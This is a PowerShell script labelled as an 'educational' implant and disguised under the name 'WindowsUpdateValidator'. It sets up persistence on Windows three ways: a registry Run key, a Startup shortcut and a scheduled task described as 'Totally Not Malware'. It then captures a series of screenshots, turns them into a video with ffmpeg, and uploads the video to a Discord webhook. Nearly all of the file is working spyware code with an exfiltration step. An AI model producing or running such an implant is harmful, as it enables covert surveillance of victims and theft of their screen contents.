
# WindowsUpdateValidator.ps1
# Orion's Multi-Vector Implant (Educational Use Only)

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Persist-Registry {
    $path = "$env:APPDATA\WindowsUpdateValidator\WindowsUpdateValidator.exe"
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateValidator" -Value $path -PropertyType String -Force
}

function Persist-StartupShortcut {
    $path = "$env:APPDATA\WindowsUpdateValidator\WindowsUpdateValidator.exe"
    $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateValidator.lnk"
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($shortcutPath)
    $Shortcut.TargetPath = $path
    $Shortcut.Save()
}

function Persist-ScheduledTask {
    $exe = "$env:APPDATA\WindowsUpdateValidator\WindowsUpdateValidator.exe"
    $action = New-ScheduledTaskAction -Execute $exe
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdateValidator" -Description "Totally Not Malware" -User "$env:USERNAME" -RunLevel LeastPrivilege
}

function Capture-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $file = "$env:TEMP\snap_$((Get-Date).ToString('yyyyMMdd_HHmmss')).jpg"
    $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $file
}

# Main Execution
Persist-Registry
Persist-StartupShortcut
Persist-ScheduledTask

# Screenshot Collection Loop
$screenshots = @()
for ($i = 0; $i -lt 15; $i++) {
    $screenshots += Capture-Screenshot
    Start-Sleep -Milliseconds 333
}

# Assemble into video with ffmpeg
$ffmpegPath = "$env:APPDATA\ffmpeg\bin\ffmpeg.exe"
$outputVideo = "$env:TEMP\capture.mp4"
& $ffmpegPath -y -framerate 3 -i "$env:TEMP\snap_*.jpg" -c:v libx264 -r 30 -pix_fmt yuv420p $outputVideo

# Optional Discord exfiltration
$webhook = "https://discord.com/api/webhooks/your_webhook_id"
Invoke-RestMethod -Uri $webhook -Method Post -Form @{ file = Get-Item $outputVideo }
